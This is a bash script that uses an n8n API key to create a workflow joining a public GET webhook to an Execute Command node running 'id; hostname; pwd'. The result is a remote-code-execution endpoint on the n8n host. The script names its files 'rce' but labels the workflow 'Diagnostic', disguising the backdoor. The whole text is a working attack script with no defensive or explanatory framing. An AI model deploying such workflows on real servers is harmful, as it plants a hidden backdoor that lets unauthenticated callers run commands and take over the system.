RCE_PATH="diag-$(date +%s)"
echo "$RCE_PATH" > /tmp/n8n-rce-path

cat > /tmp/n8n-rce-workflow.json <<EOF
{
  "name": "Diagnostic $RCE_PATH",
  "nodes": [
    {
      "parameters": {
        "httpMethod": "GET",
        "path": "$RCE_PATH",
        "responseMode": "lastNode",
        "options": {}
      },
      "id": "webhook-node",
      "name": "Diagnostic Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2,
      "position": [200, 300],
      "webhookId": "$RCE_PATH"
    },
    {
      "parameters": {
        "command": "id; hostname; pwd"
      },
      "id": "command-node",
      "name": "Execute Diagnostic",
      "type": "n8n-nodes-base.executeCommand",
      "typeVersion": 1,
      "position": [450, 300]
    }
  ],
  "connections": {
    "Diagnostic Webhook": {
      "main": [
        [
          {
            "node": "Execute Diagnostic",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  },
  "settings": {}
}
EOF


HTTP_CODE=$(
  curl -sS \
    -o /tmp/n8n-rce-create-response.json \
    -w '%{http_code}' \
    -X POST http://127.0.0.1:5678/api/v1/workflows \
    -H "X-N8N-API-KEY: $N8N_API_KEY" \
    -H 'Content-Type: application/json' \
    --data-binary @/tmp/n8n-rce-workflow.json
)

echo "HTTP: $HTTP_CODE"
python3 -m json.tool /tmp/n8n-rce-create-response.json